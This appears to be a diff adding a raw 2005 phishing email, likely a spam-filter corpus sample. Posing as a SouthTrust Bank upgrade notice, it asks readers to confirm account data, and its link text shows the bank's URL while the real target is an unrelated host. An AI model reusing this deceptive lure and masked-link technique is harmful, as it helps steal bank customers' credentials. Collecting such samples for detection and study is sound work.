@@ -1,0 +1,95 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id AC1312A88C
+	for <user@example.com>; Sat,  1 Oct 2005 17:01:57 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id A7653621C90; Sat,  1 Oct 2005 17:01:57 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 8F4AD621C78
+	for <user@example.com>; Sat,  1 Oct 2005 17:01:57 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id RAA24051
+	for user@example.com; Sat, 1 Oct 2005 17:01:57 -0400
+Received: from southtrust.com ([221.144.36.16])
+	by mail.example.com with SMTP id RAA24043
+	for <user@example.com>; Sat, 1 Oct 2005 17:01:55 -0400
+Message-Id: <200510012101.RAA24043@mail.example.com>
+From: <Securiyc@southtrust.com>
+To: <user@biochemistry.BIOC.cwru.edu>
+Subject: Account Notification - Issue #KMM327969872pb
+Date: Sat, 1 Oct 2005 17:01:58 -0500
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Length: 2546
+Lines: 63
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 176
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>South Trust</title>
+<base href="http://expo93.co.kr/~green/www.southtrust.com/index.php">
+</head>
+
+<body>
+<img src="http://lookintothewell.com/st.gif" width="207" height="71"><table  border="0" cellspacing="0" 
+cellpadding="0">
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Dear South Trust Bank customer, </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Technical services of the South Trust Bank are carrying out a planned software and hardware upgrade. </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">We earnestly ask you to visit the following link to start the procedure of confirmation of customer's data. </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif"><a href="http://expo93.co.kr/~green/www.southtrust.com/index.php" target="_blank">https://www.southtrust.com/st/PersonalBanking/customers/upgrade=confirmation</a></font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">Please do not answer to this email - follow the instructions given above. </font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">&nbsp;</font></td>
+  </tr>
+  <tr>
+    <td><font size="2" face="Verdana, Arial, Helvetica, sans-serif">We present our apologies and thank you for co-operating. </font></td>
+  </tr>
+  <tr>
+    <td><table  border="0" align="right" cellpadding="0" cellspacing="0">
+      <tr>
+        <td>&nbsp;</td>
+      </tr>
+      <tr>
+        <td><div align="right"><font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif">Copyright &copy; 2005 SouthTrust. All Rights Reserved</font></div></td>
+      </tr>
+      <tr>
+        <td><div align="right"><font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif">SouthTrust Bank, Member FDIC. </font></div></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+</body>
+</html>
+
+znldgz
+
